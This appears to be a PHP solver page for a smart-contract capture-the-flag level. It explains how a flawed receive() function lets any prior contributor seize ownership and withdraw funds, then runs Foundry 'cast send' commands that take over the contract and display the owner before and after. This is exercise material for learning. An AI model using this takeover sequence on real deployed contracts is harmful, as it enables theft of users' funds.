<?php 
include "prepare.php";
if (!$_POST):
?>
<pre>

🔥 THE IMPORTANT LOGIC TO EXPLOIT
✔ Step 1 — contribute() lets you become owner
if (contributions[msg.sender] > contributions[owner]) {
    owner = msg.sender;
}


Owner starts with:

contributions[owner] = 1000 ether


So you cannot beat the owner using contribute() alone — but that's fine, because:

✔ Step 2 — The receive() function rewrites owner
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}


So anyone becomes owner if:

They already contributed something (contributions[msg.sender] > 0)

Then send any ETH using fallback/receive
(NOT calling a function — just sending raw ETH)

🧨 FINAL EXPLOIT

The attack is:

1. Call contribute() with any amount < 0.001 ETH

→ This sets your contributions[msg.sender] > 0

2. Send ETH directly to the contract

→ This triggers receive()
→ You become owner

3. Now owner == you
4. You can call withdraw() and steal all funds


<?php
exit;
endif;

echo "<pre><div style='color:red; font-size:24px; font-weight:bold; 1border:2px solid red; padding:5px; width:340px;'>
SELECTED CONTRACT
</div>";
echo "$CONTRACT\n";

echo "\n=== BALANCES ===\n";
echo cast("cast balance $CONTRACT --rpc-url $RPC");
echo cast("cast balance $PLAYER --rpc-url $RPC");

echo "\n";
echo "<div style='color:red; font-size:24px; font-weight:bold; 1border:2px solid red; padding:5px; width:260px;'>
OWNER BEFORE
</div>";

$beforeOwner = cast("cast call $CONTRACT \"owner()\" --rpc-url $RPC");
echo "<span style='color:red; font-size:18px; font-weight:bold;'>$beforeOwner</span>\n";


echo "\n=== CALL contribute() ===\n";
echo cast(
    "cast send $CONTRACT \"contribute()\" ".
    "--value 10000 " .
    "--private-key $PK " .
    "--rpc-url $RPC"
);

echo "\n=== TRIGGER FALLBACK ===\n";
echo cast(
    "cast send $CONTRACT " .
    "--value 1 " .
    "--private-key $PK " .
    "--rpc-url $RPC"
);

echo "\n";
echo "<div style='color:red; font-size:24px; font-weight:bold; 1border:2px solid red; padding:5px; width:240px;'>
OWNER AFTER
</div>";

$afterOwner = cast("cast call $CONTRACT \"owner()\" --rpc-url $RPC");
echo "<span style='color:green; font-size:20px; font-weight:bold;'>$afterOwner</span>\n";

echo "</pre>";

?>
